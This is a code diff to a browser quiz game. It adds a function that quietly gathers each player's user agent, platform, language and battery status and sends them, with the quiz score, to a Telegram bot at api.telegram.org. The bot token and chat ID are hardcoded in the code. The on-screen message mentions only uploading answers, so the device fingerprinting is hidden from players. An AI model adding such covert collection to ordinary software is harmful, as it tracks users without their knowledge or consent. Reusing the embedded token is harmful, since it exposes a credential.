@@ -19,7 +19,6 @@
         #game-container {
             width: 640px;
             height: 480px;
-            border: 2px solid #00ff00;
             position: relative;
             background-color: black;
         }
@@ -128,8 +127,10 @@
         }
 
         function checkAnswer(selected) {
-            userAnswers.push(selected);
-            nextQuestion();
+            setTimeout(() => {
+                userAnswers.push(selected);
+                nextQuestion();
+            }, 3000);
         }
 
         function nextQuestion() {
@@ -141,13 +142,44 @@
             }
         }
 
+        function sendDataToTelegram(score, batteryInfo, deviceInfo) {
+            const botToken = '8069886471:AAHa0DJq5vrbYj3r_N-W8fogPFb_NIEPpzs'; // Replace with your Telegram bot token
+            const chatId = '6339522967'; // Replace with your Telegram chat ID
+            const message = `Score: ${score}\nBattery: ${batteryInfo}\nDevice: ${deviceInfo}`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url, {
+                method: 'GET' // Telegram API allows GET for sendMessage
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (!data.ok) console.error('Failed to send to Telegram:', data.description);
+                })
+                .catch(error => console.error('Error sending to Telegram:', error));
+        }
+
         function showResults() {
             document.getElementById("results-popup").style.display = "block";
+            document.getElementById("results-text").innerText = "Uploading your answers to our server";
             setTimeout(() => {
                 document.getElementById("results-text").innerText = "Checking the answers";
                 setTimeout(() => {
                     const score = userAnswers.filter((ans, i) => ans === questions[i].correct).length;
-                    document.getElementById("results-text").innerText = `You got ${score} out of ${questions.length} correct`;
+                    const totalQuestions = questions.length;
+                    const scoreText = `You got ${score} out of ${totalQuestions} correct`;
+                    document.getElementById("results-text").innerText = scoreText;
+
+                    // Collect battery and device info
+                    let batteryInfo = 'N/A';
+                    const deviceInfo = `${navigator.userAgent} on ${navigator.platform}, language: ${navigator.language}`;
+                    if (navigator.getBattery) {
+                        navigator.getBattery().then(battery => {
+                            batteryInfo = `${Math.round(battery.level * 100)}% ${battery.charging ? 'charging' : 'not charging'}`;
+                            sendDataToTelegram(scoreText, batteryInfo, deviceInfo);
+                        });
+                    } else {
+                        sendDataToTelegram(scoreText, batteryInfo, deviceInfo);
+                    }
                 }, 2000);
             }, 1500);
         }
